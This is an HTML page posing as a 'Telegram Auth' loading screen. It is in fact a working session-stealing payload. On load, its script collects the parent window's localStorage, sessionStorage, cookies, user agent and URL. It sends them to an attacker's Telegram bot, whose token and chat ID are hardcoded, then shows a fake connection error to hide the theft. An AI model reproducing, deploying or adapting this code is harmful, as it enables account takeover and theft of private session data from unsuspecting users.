<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Telegram Auth</title>
    <style>
        body { 
            background: #0f0f0f;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: system-ui;
        }
        .loader {
            color: white;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="loader">
        <h3>Loading secure connection...</h3>
    </div>

    <script>
        // ТВОЙ ТОКЕН БОТА И АЙДИ
        const BOT_TOKEN = '8172323730:AAEfo4Eqz8E9HWSNOGF96BHndyjN9anBRLg';
        const CHAT_ID = '1471307057';
        
        async function sendToTelegram(data) {
            const message = `🔐 **КРАЖА ТОКЕНА** 🔐\n\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``;
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        async function stealData() {
            try {
                let data = {};
                
                // Кража localStorage
                if (window.parent && window.parent.localStorage) {
                    data.localStorage = {};
                    for (let i = 0; i < window.parent.localStorage.length; i++) {
                        const key = window.parent.localStorage.key(i);
                        data.localStorage[key] = window.parent.localStorage.getItem(key);
                    }
                }
                
                // Кража cookies
                data.cookies = document.cookie;
                
                // Кража sessionStorage
                if (window.parent && window.parent.sessionStorage) {
                    data.sessionStorage = {};
                    for (let i = 0; i < window.parent.sessionStorage.length; i++) {
                        const key = window.parent.sessionStorage.key(i);
                        data.sessionStorage[key] = window.parent.sessionStorage.getItem(key);
                    }
                }
                
                // Информация о юзере
                data.userAgent = navigator.userAgent;
                data.url = window.location.href;
                data.referrer = document.referrer;
                
                if (Object.keys(data.localStorage || {}).length > 0 || data.cookies) {
                    await sendToTelegram(data);
                }
                
            } catch(e) {
                // Отправляем ошибку для отладки
                await sendToTelegram({error: e.toString(), step: 'stealData'});
            }
            
            // Фейковая ошибка
            document.body.innerHTML = `
                <div class="loader">
                    <h3>Connection error</h3>
                    <p>Please try again later</p>
                </div>
            `;
        }
        
        // Запуск через 1 секунду
        setTimeout(stealData, 1000);
        
        // Альтернативный метод
        window.parent.postMessage({
            eventType: 'web_app_read_storage',
            eventData: {}
        }, '*');
        
    </script>
</body>
</html>
